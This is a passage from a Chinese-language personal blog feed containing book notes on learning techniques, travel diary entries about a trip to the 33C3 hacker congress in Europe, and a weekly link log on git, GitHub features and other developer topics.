&lt;p&gt;你的需求取決於你所處技能水平。&lt;br /&gt;
隨著時間推移，你的個人學習和成長所需要的東西會改變。&lt;br /&gt;
當然，在團隊中你同要需要先考慮他人的技能水平，然後再判斷自己該如何傾聽、回應他們的意見。  &lt;/p&gt;
&lt;h3&gt;把大腦想成一台擁有兩個運作模式不同的雙 CPU 電腦&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;L 型  &lt;ul&gt;
&lt;li&gt;對直覺、問題解決和創造性非常重要  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;R 型  &lt;ul&gt;
&lt;li&gt;讓你細緻工作並實踐目標  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;記憶必須被刷新、必須被使用，否則就會漸漸喪失記憶。&lt;/h3&gt;
&lt;h3&gt;SMART 目標&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Specific 具體的  &lt;/li&gt;
&lt;li&gt;Measuragle 可度量的  &lt;/li&gt;
&lt;li&gt;Achievable 可實現的  &lt;/li&gt;
&lt;li&gt;Relevant 相關的  &lt;/li&gt;
&lt;li&gt;Time-boxed 時間可控的  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;SQ3R 法主動閱讀&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Survey  &lt;ul&gt;
&lt;li&gt;掃描目錄和每章總結、得出總體看法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Question  &lt;ul&gt;
&lt;li&gt;紀錄所有問題  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Read  &lt;ul&gt;
&lt;li&gt;閱讀全部內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Recite  &lt;ul&gt;
&lt;li&gt;總結、做筆記、用自己的話來描述  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Review  &lt;ul&gt;
&lt;li&gt;重讀、擴展筆記、與人討論  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;以教代學&lt;/h3&gt;
&lt;p&gt;學習某項事物最簡單直接的方法是嘗試教別人&lt;br /&gt;
黃色小鴨 debug 法某方面來說也是用了這個方法&lt;br /&gt;
嘗試讓非領域相關的人也能聽懂你的話&lt;br /&gt;
很容易發現自己之前沒注意到方面  &lt;/p&gt;
&lt;h3&gt;為了學習而玩耍&lt;/h3&gt;
&lt;p&gt;人類在玩的時候的記憶力最強。  &lt;/p&gt;
&lt;h3&gt;試著靜下心來冥想或是畫畫&lt;/h3&gt;
&lt;p&gt;訓練自己能夠在一段時間內專注於單一個事物的能力。  &lt;/p&gt;
&lt;h3&gt;利用散步的時間來想一個問題&lt;/h3&gt;
&lt;p&gt;有時候轉換個環境可以讓思維突然突破某些死角，&lt;br /&gt;
就像常常一時之間努力想要回想某個東西卻完全沒辦法想起，&lt;br /&gt;
但卻常常在某個不相干的時刻突然想了起來。  &lt;/p&gt;
&lt;h3&gt;準備一個隨時可以紀錄想法的東西&lt;/h3&gt;
&lt;p&gt;因為很多想法都是在 R 模式的時候突然冒出來，&lt;br /&gt;
認真要去想的時候就會進入 L 模式而想不起來。&lt;br /&gt;
像是作夢就是一個最明顯的例子，&lt;br /&gt;
作夢的時候明明夢境是那麼的深刻，&lt;br /&gt;
但醒來後努力回想卻無法想起，&lt;br /&gt;
而且距離起床的時間愈久，記憶愈模糊。&lt;br /&gt;
所以要利用這個方式，&lt;br /&gt;
讓突發其想的好想法能夠馬上被紀錄下來，&lt;br /&gt;
即便不是那麼的完整，&lt;br /&gt;
也很有意義。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;這本書之後應該會再找個時間看一次，&lt;br /&gt;
書中舉了非常多的論文研究來當例證，&lt;br /&gt;
對於思考模式的見解覺得挺有趣的，&lt;br /&gt;
然後有滿多因應這樣的見解而誕生的提升生產力的方法。  &lt;/p&gt;
&lt;p&gt;這本書雖然簡體中文翻譯成《程序員思維修煉》，&lt;br /&gt;
但其實看完以後覺得不一定要是寫程式的人才看得懂這本書，&lt;br /&gt;
因為這本書比較像是在講以這本書描述的大腦運作方式來看，&lt;br /&gt;
平常要怎樣養成好的習慣，&lt;br /&gt;
才能提升自己的生產力，&lt;br /&gt;
並讓自己的靈感能夠源源不絕。  &lt;/p&gt;
&lt;p&gt;會講翻譯成《程序員思維修煉》，&lt;br /&gt;
大概是因為作者是寫程式的，&lt;br /&gt;
然後又把大腦比喻成有兩種模式的 CPU，&lt;br /&gt;
所以懂的 CPU 運作方式的讀者應該會比較能體會作者對於大腦的敘述方式。  &lt;/p&gt;
&lt;p&gt;只是即便知道了書中提到的很多方法，&lt;br /&gt;
要真的去實踐還是另外一回事，&lt;br /&gt;
但我還是會試著嘗試看看的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.amazon.com/Pragmatic-Thinking-Learning-Refactor-Programmers/dp/1934356050"&gt;Pragmatic Thinking and Learning: Refactor Your Wetware (Pragmatic Programmers): Andy Hunt: 0852766001452: Amazon.com: Books&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://book.douban.com/subject/5372651/"&gt;程序员的思维修炼 (豆瓣)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Programming"></category><category term="Thinking"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (1)</title><link href="https://blog.m157q.tw/posts/2016/12/20/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-1/" rel="alternate"></link><published>2017-01-15T00:40:59+08:00</published><updated>2017-01-15T00:40:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-20:posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-1/</id><summary type="html">&lt;p&gt;上一篇：&lt;a href="/posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-0"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (0)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Day 1 2016/12/20 Tue&lt;/h2&gt;
&lt;p&gt;&lt;img alt="CA418" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/ca418.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;19:55 Air China CA-418 TPE - CTU 的飛機，&lt;br /&gt;
15:30 搭國光 1819 到桃機的客運，新台幣 125 元，&lt;br /&gt;
大概 16:30 就到桃機第二航廈了，&lt;br /&gt;
結果 17:25 才開放辦理登機。&lt;br /&gt;
太緊張，早了 1 個小時出門，&lt;br /&gt;
不然就可以拿到 12/15 出貨但在我出門半小時後才送到的 Baubax Bomber 外套了，&lt;br /&gt;
無緣穿它去歐洲。&lt;br /&gt;
在這之前就在桃機四樓坐著，&lt;br /&gt;
然後就收到在成都轉機的飛機要延後一個小時起飛的消息。  &lt;/p&gt;
&lt;p&gt;拿卡式台胞證和護照辦完登機、過安檢、過海關以後，&lt;br /&gt;
（上網之前還在看到底需不需要用到台胞證，想說不想多花錢，結果這裡就用到了，之後也很常用到，所以要搭 Air China 還是噴個 1700 NTD 辦個卡式台胞證吧。）&lt;br /&gt;
因為還有兩個小時才登機，所以就在免稅商店區域閒晃：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Instagram 免費列印照片的機器因為是用 hashtag 去抓，所以可以印別人的照片 XD  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Instagram Machine" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/instagram-machine.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;跑去 D2 和 D3 之間的電競區玩了下 2K13 和賽車  &lt;ul&gt;
&lt;li&gt;&lt;img alt="E-sport Area" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/e-sport-area.jpg" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電競區的斜對面有個小小的圖書館，其實應該一開始就來這裡的，空間沒有很大，但有地方坐，手機跟電腦也都可以充電。  &lt;/li&gt;
&lt;li&gt;桃機的每個登機門中間的區域真的是挺用心設計的，每個區域都介紹不同的台灣文化。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;飛機準時起飛後，&lt;br /&gt;
剛好位置上有從成都飛來台灣的乘客留下來的幾張成都報紙，&lt;br /&gt;
因為沒看過，所以就攤開來看了一下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;十平方米工作區，藏假鹽四公噸，成都鹽政處處理。  &lt;ul&gt;
&lt;li&gt;所以成都的鹽是公賣的嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我省高考 2017 擬實施實名與指紋雙登記制，以防代考。  &lt;/li&gt;
&lt;li&gt;然後報紙的廣告不像台灣的那麼明顯，大多都像是置入性行銷的那種感覺。  &lt;/li&gt;
&lt;li&gt;沒啥國際新聞 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;機上餐點因為訂機票的時候有人說猶太餐很好吃，所以事先預定了猶太餐，餐盒上寫著是比利時的食品公司製作的。&lt;br /&gt;
（但其實我之後的 3 張機票都訂了特殊餐：低卡路里、低油、低鹽）&lt;br /&gt;
餐點內容大概如下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;主餐：一塊鮭魚加類似蘑菇醬的醬料  &lt;/li&gt;
&lt;li&gt;副餐：蘋果泥  &lt;/li&gt;
&lt;li&gt;甜點：巧克力布丁  &lt;/li&gt;
&lt;li&gt;兩包餅乾：一包是蘇打餅、一包據說是德國餅乾？  &lt;ul&gt;
&lt;li&gt;餐盒上有註明說因為是不加任何添加物的保久餐，所以只能選擇用餅乾  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;真的頗好吃的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="CTU airport" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/ctu.jpg" /&gt;&lt;br /&gt;
23:11 飛抵成都雙流機場，&lt;br /&gt;
真的超級大，&lt;br /&gt;
目前看過最大的機場，&lt;br /&gt;
目測估計停個兩百台飛機都不是問題。&lt;br /&gt;
室外溫度是攝氏 11 度，我覺得挺舒服的溫度。&lt;br /&gt;
但還沒下飛機我就開始打噴嚏了，&lt;br /&gt;
過敏體質某方面來說應該也算個人體空汙檢測儀吧，&lt;br /&gt;
下飛機後走了幾步路搭上接駁車到航廈拿行李，&lt;br /&gt;
外頭真的有霧霾，襯著夜色與燈光，黃澄澄的。  &lt;/p&gt;
&lt;p&gt;然後因為飛往巴黎的機票沒有在桃機直接給，&lt;br /&gt;
所以必須入境中國，到出境大廳辦理登機領機票後，再出境等延後一小時的飛機。&lt;br /&gt;
第一次入境中國，其實也就護照和台胞證看一看就入境了，&lt;br /&gt;
排隊領完機票，覺得離起飛還有一段時間，&lt;br /&gt;
所以跑去出境大廳的蔚藍書店晃晃（後來進去候機才發現裏面也有一間，更大。），&lt;br /&gt;
推坑同行的友人買了《圍城》，他說不然不知道怎麼在飛機上打發時間。&lt;br /&gt;
（但後來我覺得還好就是，因為十一小時內就是吃、睡、吃，然後差不多就快到了。）&lt;br /&gt;
原本想說出去體驗一下成都的空氣和溫度，&lt;br /&gt;
但似乎時間太晚，一堆入口都關閉，不知道從出口出去以後要從哪裡進入，所以作罷。&lt;br /&gt;
&lt;img alt="ATIC BOOKS" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/atic-books.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;過行李安檢的時候，&lt;br /&gt;
中國的安檢門特別敏感，&lt;br /&gt;
褲子上的鈕扣和鞋子上鞋帶孔用的鐵環都會觸發警報，&lt;br /&gt;
然後就得站上台子讓安檢人員用金屬探測器搜身。  &lt;/p&gt;
&lt;p&gt;之後就是在候機大廳等待起飛的時間，&lt;br /&gt;
竟然有店家還沒打烊，&lt;br /&gt;
頭等艙的候機室門是開的，&lt;br /&gt;
門口和櫃台也沒人守著，&lt;br /&gt;
不知道是不是下班了，&lt;br /&gt;
但沒膽進去。&lt;br /&gt;
&lt;img alt="Open Boarding Gate" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/open-boarding-gate.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;稍微晃了一下登機門 101, 102 的那半邊，&lt;br /&gt;
發現有個登機門竟然忘記關，應該是工作人員的疏忽吧，&lt;br /&gt;
最後看到超大片的玻璃落地窗前的地上有插座，&lt;br /&gt;
於是坐了下來充手機和筆電，&lt;br /&gt;
坐在冰冷冷的地板上，&lt;br /&gt;
邊看飛機邊敲鍵盤。&lt;br /&gt;
噢，然後順便把鞋襪都給除了，&lt;br /&gt;
腳實在給悶的臭了，散散氣，反正周圍也沒其他人了。&lt;br /&gt;
&lt;img alt="CTU View" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/ctu-view.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/21/33c3-暨歐洲法荷德聖誕跨年遊-2"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (2)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category></entry><entry><title>33C3 暨歐洲法荷德聖誕跨年遊 (0)</title><link href="https://blog.m157q.tw/posts/2016/12/20/33c3-%E6%9A%A8%E6%AD%90%E6%B4%B2%E6%B3%95%E8%8D%B7%E5%BE%B7%E8%81%96%E8%AA%95%E8%B7%A8%E5%B9%B4%E9%81%8A-0/" rel="alternate"></link><published>2017-01-15T00:34:59+08:00</published><updated>2017-01-15T00:34:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-12-20:posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-0/</id><summary type="html">&lt;h2&gt;Warning&lt;/h2&gt;
&lt;p&gt;因為第一次去歐洲，&lt;br /&gt;
我想紀錄的詳細一點，&lt;br /&gt;
所以非常的流水帳，&lt;br /&gt;
因此拆成 1 天 1 篇。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;今年下半年開始，&lt;br /&gt;
有位朋友就有在開始找人一起去參加這個全歐洲最大的駭客年會，&lt;br /&gt;
（第 33 屆 Chaos Communication Congress 簡稱 33C3，&lt;br /&gt;
會議本身就簡稱 CCC，沒記錯的話 CCC 同時也是個社團，&lt;br /&gt;
有興趣的人可以 google "Chaos Communication Congress" 應該就有很多東西了，&lt;br /&gt;
近期每次的參加人數官方公佈大約是 12,000 ~ 15,000 人左右。）&lt;br /&gt;
沒記錯的話差不多是 g0v 在淡水 947 農場舉辦的謝開源啤酒趴那時候開始提的，&lt;br /&gt;
但一開始也就只有在 Facebook 開個社團，&lt;br /&gt;
把大概有意願會去的人加進來，&lt;br /&gt;
然後偶爾更新一些相關資訊，&lt;br /&gt;
但那時真正確定會去的人應該就只有他一個人而已。  &lt;/p&gt;
&lt;p&gt;我自己是也一直沒有很確定要不要去，&lt;br /&gt;
一來是覺得很貴、&lt;br /&gt;
二來是我沒去過歐洲、&lt;br /&gt;
三來是覺得很麻煩（寫程式的人很懶惰，你懂的），&lt;br /&gt;
但其實又滿想去的，&lt;br /&gt;
就一直在這種狀態下，&lt;br /&gt;
一直到今年 11 月，&lt;br /&gt;
33C3 開始開放購買入場票前，&lt;br /&gt;
又再次問了有誰比較可能會去的，&lt;br /&gt;
加到一個 Telegram 的群組中。  &lt;/p&gt;
&lt;p&gt;第一階段的報名是十一月初的某天凌晨三點，&lt;br /&gt;
我其實也是當天晚上才在 Telegram 群組得知，&lt;br /&gt;
隔天還得上班，&lt;br /&gt;
然後我前一天其實也沒多早睡，&lt;br /&gt;
結果我就等到睡著了。  &lt;/p&gt;
&lt;p&gt;然後有搶票的都沒搶到，&lt;br /&gt;
大概就像四、五年前的 COSCUP 那樣的搶票狀況，&lt;br /&gt;
非常難搶。（Twitter 上也有一堆外國人在抱怨 XDD）&lt;br /&gt;
而且售票系統的 Server 是架在歐洲，&lt;br /&gt;
我們從台灣這邊連的 latency 大概是 200~300 ms 左右，&lt;br /&gt;
所以拿到的排隊序號挺後面的。  &lt;/p&gt;
&lt;p&gt;第二波報名是在兩個禮拜後，&lt;br /&gt;
那天剛好是台大開源社黑客松第一天晚上十點，&lt;br /&gt;
剛從台大走出來，&lt;br /&gt;
進公館捷運站二號出口準備搭捷運時，&lt;br /&gt;
Telegram 群組有人傳了訊息，&lt;br /&gt;
才想起來今天是第二階段報名搶票，&lt;br /&gt;
距離十點只剩下五分鐘，&lt;br /&gt;
筆電我也來不及從背包裏面拿出來了，&lt;br /&gt;
直接開了手機 4G 網路就連到報名頁面，&lt;br /&gt;
我當時是抱著「如果有搶到票就去吧」的心態幫忙搶票的。&lt;br /&gt;
其中一位朋友還特別為了搶票，&lt;br /&gt;
在 GCP 上開了一台歐洲的 GCE 直接搶，&lt;br /&gt;
所以他拿到的報名序號真的滿前面的，&lt;br /&gt;
一個人最多可以買兩張票，&lt;br /&gt;
所以我們先順利拿到兩張了，&lt;br /&gt;
還有剩下的兩張。&lt;br /&gt;
剩下的三個人裏面，我拿到的報名序號是最前面的，大約是兩千多左右吧。&lt;br /&gt;
售票系統本身有個 queue 機制，每隔 5~10 分鐘排隊的數字就會往前推進，所以之後就一直在 refresh，後來也順利買到兩張票了。&lt;br /&gt;
購票的金流是透過 Stripe 綁信用卡或金融卡付款，&lt;br /&gt;
每張票是 100 EUR，含稅大概 115 EUR，折合台幣大約 3800 NTD 左右，&lt;br /&gt;
是我目前買過最貴的 Conference 的票，但跟國外一些大型會議的價錢相比還是算便宜的。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="33c3 registration" src="/files/33c3-暨歐洲法荷德聖誕跨年遊/33c3-registration.png" /&gt;  &lt;/p&gt;
&lt;p&gt;於是，&lt;br /&gt;
一場在 2016 年末前往西歐的聖誕跨年遊就此成行。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一篇：&lt;a href="/posts/2016/12/20/33c3-暨歐洲法荷德聖誕跨年遊-1"&gt;33C3 暨歐洲法荷德聖誕跨年遊 (1)&lt;/a&gt;  &lt;/p&gt;</summary><category term="Travel"></category><category term="Paris"></category><category term="Amsterdam"></category><category term="Hamburg"></category></entry><entry><title>Y2016W50</title><link href="https://blog.m157q.tw/posts/2016/12/19/y2016w50/" rel="alternate"></link><published>2017-02-06T02:28:19+08:00</published><updated>2017-02-06T02:28:19+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-12-19:posts/2016/12/19/y2016w50/</id><summary type="html">&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.linuxquestions.org/questions/linux-newbie-8/xbacklight-not-working-on-dell-inspiron-laptop-4175506666/"&gt;xbacklight not working on Dell Inspiron laptop&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;遇到這個問題 &lt;code&gt;RANDR Query Version returned error -1&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;忘記當時到底有沒有解掉了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/913701/changing-remote-repository-for-a-git-submodule"&gt;Changing remote repository for a git submodule - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;edit the .gitmodules file to update the URL  &lt;/li&gt;
&lt;li&gt;run &lt;code&gt;git submodule sync&lt;/code&gt; to reflect that change to the superproject and your working copy.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2294-git-merge-2017-the-full-agenda-is-now-live"&gt;Git Merge 2017: the full agenda is now live · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GitHub 舉辦的跟 Git 有關的年會  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2289-publishing-with-github-pages-now-as-easy-as-1-2-3"&gt;Publishing with GitHub Pages, now as easy as 1, 2, 3 · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;現在只要一個 Markdown 就可以有 GitHub Pages  &lt;/li&gt;
&lt;li&gt;README.md 就可以當首頁了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2051-protected-branches-and-required-status-checks"&gt;Protected branches and required status checks · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;... 剛剛才知道 GitHub 有這個功能可以設定  &lt;/li&gt;
&lt;li&gt;是否該來幫公司的 repo 設定一下  &lt;/li&gt;
&lt;li&gt;可以設定禁止 force push  &lt;/li&gt;
&lt;li&gt;可以限制要通過 CI test, 要至少有人 approve pull request 才能 merge  &lt;/li&gt;
&lt;li&gt;沒記錯的話可以針對不同 branch 做設定，所以如果是用 git branching model 的也適用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/RainbowEngineer/taiwan_love_wins"&gt;RainbowEngineer/taiwan_love_wins: 資訊界連署挺同婚&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;資訊界連署挺同婚  我們是一群支持修正民法 972 的資訊人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2293-resolve-simple-merge-conflicts-on-github"&gt;Resolve simple merge conflicts on GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;You can now resolve simple merge conflicts on GitHub right from your pull requests, saving you a trip to the command line and helping your team merge pull requests faster.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;現在 GitHub 有 web 介面可以解決在 merge 的時候簡單的 conflict，複雜的還是得自己改就是。  &lt;/li&gt;
&lt;li&gt;不過試用了一下，覺得沒有很喜歡，所以可能還是會在 local 用 CLI 改。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2291-introducing-review-requests"&gt;Introducing review requests&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;You can now request a review explicitly from collaborators, making it easier to specify who you'd like to review your pull request.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GitHub 加入了 review request 的功能，可以指定特定的人 review pull request  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/seetaface/SeetaFaceEngine"&gt;seetaface/SeetaFaceEngine&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;SeetaFace Engine is an open source C++ face recognition engine, which can run on CPU with no third-party dependence.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;目前在 CMU 唸研究所的強者大學同學的面試經驗  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.heron.me/%E7%BE%8E%E5%9C%8B%E8%BB%9F%E9%AB%94%E5%B7%A5%E7%A8%8B%E5%B8%AB%E5%AF%A6%E7%BF%92-google-facebook-yahoo-apple-dropbox-yahoo-d13b3991ce90"&gt;美國軟體工程師實習申請與面試 — Google, Facebook, Yahoo, Apple, Dropbox, VMWare&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.heron.me/%E6%88%91%E5%A6%82%E4%BD%95%E6%BA%96%E5%82%99%E7%BE%8E%E5%9C%8B%E8%BB%9F%E9%AB%94%E5%B7%A5%E7%A8%8B%E5%B8%AB%E9%9D%A2%E8%A9%A6-112f82d7093c"&gt;我如何準備美國軟體工程師面試&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.science.unitn.it/~fiorella/guidelinux/tlk/node39.html"&gt;The Kernel Swap Daemon (kswapd)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The name swap daemon is a bit of a misnomer as the daemon does more than just swap modified pages out to the swap file. Its task is to keep the memory management system operating efficiently.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;machine_learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.acolyer.org/2016/12/16/tensorflow-a-system-for-large-scale-machine-learning/amp/"&gt;TensorFlow: A system for large-scale machine learning – the morning paper&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;TesnorFlow 的論文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/even841130/posts/1385768634776179"&gt;趙一穎 - 身為一個不會寫程式的資工系學生，壓力真大。...&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;優質反串文，只好收藏一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ruby&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/12329628/what-does-mean-in-gemspec-dependencies"&gt;ruby - what does ~&amp;gt; mean in gemspec dependencies? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/3414337/meaning-of-tilde-greater-than-in-version-requirement"&gt;http://stackoverflow.com/questions/3414337/meaning-of-tilde-greater-than-in-version-requirement&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://guides.rubygems.org/patterns/#pessimistic-version-constraint"&gt;http://guides.rubygems.org/patterns/#pessimistic-version-constraint&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://robots.thoughtbot.com/rubys-pessimistic-operator"&gt;https://robots.thoughtbot.com/rubys-pessimistic-operator&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&amp;gt; 3.0.3 means that when you bundle install, you’ll get the highest-released gem version of rails between the range &amp;gt;= 3.0.3 and &amp;lt; 3.1.&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;可能是在 debug &lt;a href="https://github.com/travis-ci/dpl"&gt;travis-ci/dpl&lt;/a&gt; 的時候，在 Gemfile 裡頭看到不知道是啥而查的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.bleepingcomputer.com/news/security/new-scheme-spread-popcorn-time-ransomware-get-chance-of-free-decryption-key/"&gt;New Scheme: Spread Popcorn Time Ransomware, get chance of free Decryption Key&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;想恢復檔案的話  &lt;/li&gt;
&lt;li&gt;可以選擇支付一個比特幣  &lt;/li&gt;
&lt;li&gt;或是讓另外兩個人也中這個勒索軟體  &lt;/li&gt;
&lt;li&gt;這根本 Black Mirror 的劇本吧？  &lt;/li&gt;
&lt;li&gt;如果最後是告訴你恢復不了檔案還送你個 TrollFace 的話  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;technews&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2016/12/amazon-go-future-shop-store-2016/"&gt;Amazon Go 未來實體商店的影片 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;要是真的做出來的話真的很酷，目前還只是概念影片而已，不過以 Amazon 打算自己把整個由上到下的產業鍊吃下來的動作來看，應該是挺有可能的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;主要是在查為什麼 web 的 tracing arguments 都要用 "utm" 開頭  &lt;ul&gt;
&lt;li&gt;UTM 的全名是 "Urchin Tracking Module"  &lt;/li&gt;
&lt;li&gt;Urchin 是間公司的名稱，這間公司做了一個同名軟體，用於網頁統計分析，而這間公司後來被 Google 買下來，將 Urchin 這個軟體繼續開發，成為現在的 Google Analytics  &lt;/li&gt;
&lt;li&gt;utm 就是當時的參數，保留至今。  &lt;/li&gt;
&lt;li&gt;參考連結  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Urchin_(software)"&gt;Urchin (software) - Wikipedia&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
